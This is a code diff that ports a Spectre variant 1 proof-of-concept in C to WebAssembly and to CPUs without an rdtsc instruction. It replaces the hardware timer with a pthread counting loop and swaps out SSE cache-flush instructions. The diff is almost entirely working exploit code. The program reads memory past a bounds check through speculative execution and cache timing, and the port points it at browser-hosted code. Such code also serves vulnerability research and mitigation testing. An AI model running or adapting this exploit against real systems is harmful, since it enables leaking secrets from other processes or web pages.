@@ -11,15 +11,41 @@
 *
 **********************************************************************/
 
+// #define WASM 1
+// #define NORDTSC 1
+// #define NOCLFLUSH 1
+// #define NOMFENCE 1
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
+
+#ifdef WASM
+#define NOSSE2
+#define NORDTSC
+#else
 #ifdef _MSC_VER
 #include <intrin.h> /* for rdtsc, rdtscp, clflush */
 #pragma optimize("gt",on)
 #else
 #include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
 #endif /* ifdef _MSC_VER */
+#endif /* ifdef WASM */
+
+#ifdef NORDTSC
+#include <string.h>
+#include <pthread.h>
+// Does this conflict with stdint?
+#include <unistd.h>
+#include <stdbool.h>
+#define NORDTSCP
+#endif
+
+#ifdef WASM
+#ifndef __EMSCRIPTEN_PTHREADS__
+assert("No pthreads!");
+#endif /* __EMSCRIPTEN_PTHREADS__ */
+#endif /* WASM */
 
 /* Automatically detect if SSE2 is not available when SSE is advertized */
 #ifdef _MSC_VER
@@ -117,6 +143,11 @@ void victim_function(size_t x) {
 /********************************************************************
 Analysis code
 ********************************************************************/
+#ifdef NORDTSC
+void reset_counter();
+int get_counter();
+#endif
+
 #ifdef NOCLFLUSH
 #define CACHE_FLUSH_ITERATIONS 131072
 #define CACHE_FLUSH_STRIDE 4096
@@ -127,13 +158,21 @@ void flush_memory_sse(uint8_t * addr)
 {
   float * p = (float *)addr;
   float c = 0.f;
+#ifndef WASM
   __m128 i = _mm_setr_ps(c, c, c, c);
-
+#endif
   int k, l;
   /* Non-sequential memory addressing by looping through k by l */
   for (k = 0; k < 4; k++)
     for (l = 0; l < 4; l++)
+#ifndef WASM
       _mm_stream_ps(&p[(l * 4 + k) * 4], i);
+#else
+      p[(l * 4 + k) * 4] = c;
+      p[(l * 4 + k) * 4 + 1] = c;
+      p[(l * 4 + k) * 4 + 2] = c;
+      p[(l * 4 + k) * 4 + 3] = c;
+#endif
 }
 #endif
 
@@ -221,7 +260,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     Many older 32-bit processors won't support this, so we need to use
     the equivalent but non-serialized tdtsc instruction instead.
     */
-
+#ifndef NORDTSC
 #ifndef NOMFENCE
       /*
       Since the rdstc instruction isn't serialized, newer processors will try to
@@ -250,6 +289,11 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       junk = * addr; /* MEMORY ACCESS TO TIME */
       time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 #endif
+#else
+      reset_counter();
+      junk = * addr; /* MEMORY ACCESS TO TIME */
+      time2 = get_counter();
+#endif
 #endif
       if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
         results[mix_i]++; /* cache hit - add +1 to score for this value */
@@ -275,15 +319,106 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
   results[0] ^= junk; /* use junk so code above won’t get optimized out*/
 }
 
+int g_argc              = 0;
+const char * * g_argv = NULL;
+#ifdef NORDTSC
+pthread_t loopc;
+pthread_t get_c;
+int counter = 0;
+pthread_mutex_t lock;
+int go = 1;
+int myarray[512] = {45};
+int check = 3;
+
+void reset_counter()
+{
+    pthread_mutex_lock(&lock);
+    counter = 0;
+    pthread_mutex_unlock(&lock);
+}
+
+int get_counter()
+{
+    return counter;
+}
+
+void *loop_counter()
+{
+    while (go)
+    {
+        pthread_mutex_lock(&lock);
+        counter++;
+        pthread_mutex_unlock(&lock);
+    }
+    // printf("Counter has ended: %d\n", counter);
+    return NULL;
+}
+void *try_time();
+int main(int argc,
+  const char * * argv) {
+
+  g_argc            = argc;
+  g_argv = argv;
+
+  int error;
+
+  if (pthread_mutex_init(&lock, NULL) != 0)
+  {
+    printf("\n mutex init has failed\n");
+    return 1;
+  }
+
+  error = pthread_create(&(loopc), NULL, &loop_counter, NULL);
+  if (error != 0)
+    printf("\nThread can't be created :[%s]", strerror(error));
+
+  error = pthread_create(&(get_c), NULL, &try_time, NULL);
+  if (error != 0)
+    printf("\nThread can't be created :[%s]", strerror(error));
+
+  pthread_join(loopc, NULL);
+  pthread_join(get_c, NULL);
+
+  pthread_mutex_destroy(&lock);
+  // printf("%d\n", check);
+  return (0);
+}
+
+void *try_time()
+{
+  // int argc = 0;
+  // const char * * argv = NULL;
+  
+  // int g_argc              = 0;
+  // const char * * g_argv = NULL;
+
+  
+  /* Delay so loop_counter thread can start */
+  int z;
+  for (z = 0; z < 100000; z++)
+    ;
+
+#else
 /*
 *  Command line arguments:
 *  1: Cache hit threshold (int)
 *  2: Malicious address start (size_t)
 *  3: Malicious address count (int)
 */
+
 int main(int argc,
   const char * * argv) {
+  // int g_argc            = argc;
+  // const char * * g_argv = argv;
+    
+  g_argc            = argc;
+  g_argv = argv;
+    
+  // int g_argc              = 0;
+  // const char * * g_argv = NULL;
+
   
+#endif /* NORDTSC */
   /* Default to a cache hit threshold of 80 */
   int cache_hit_threshold = 80;
 
@@ -309,19 +444,19 @@ int main(int argc,
 
   /* Parse the cache_hit_threshold from the first command line argument.
      (OPTIONAL) */
-  if (argc >= 2) {
-    sscanf(argv[1], "%d", &cache_hit_threshold);
+  if (g_argc >= 2) {
+    sscanf(g_argv[1], "%d", &cache_hit_threshold);
   }
 
   /* Parse the malicious x address and length from the second and third
      command line argument. (OPTIONAL) */
-  if (argc >= 4) {
-    sscanf(argv[2], "%p", (void * * )( &malicious_x));
+  if (g_argc >= 4) {
+    sscanf(g_argv[2], "%p", (void * * )( &malicious_x));
 
     /* Convert input value into a pointer */
     malicious_x -= (size_t) array1;
 
-    sscanf(argv[3], "%d", &len);
+    sscanf(g_argv[3], "%d", &len);
   }
 
   /* Print git commit hash */
@@ -334,6 +469,11 @@ int main(int argc,
   
   /* Print build configuration */
   printf("Build: ");
+  #ifndef NORDTSC
+    printf("RDTSC_SUPPORTED ");
+  #else
+    printf("RDTSC_NOT_SUPPORTED ");
+  #endif
   #ifndef NORDTSCP
     printf("RDTSCP_SUPPORTED ");
   #else
@@ -358,6 +498,11 @@ int main(int argc,
     printf("LINUX_KERNEL_MITIGATION_ENABLED ");
   #else
     printf("LINUX_KERNEL_MITIGATION_DISABLED ");
+  #endif
+  #ifdef WASM
+    printf("WASM_ENABLED ");
+  #else
+    printf("WASM_DISABLED ");
   #endif
 
   printf("\n");
@@ -386,5 +531,13 @@ int main(int argc,
 
     printf("\n");
   }
+  
+  #ifndef NORDTSC
   return (0);
 }
+  #else
+  go = 0;
+  return NULL;
+}
+
+#endif /* NORDTSC */
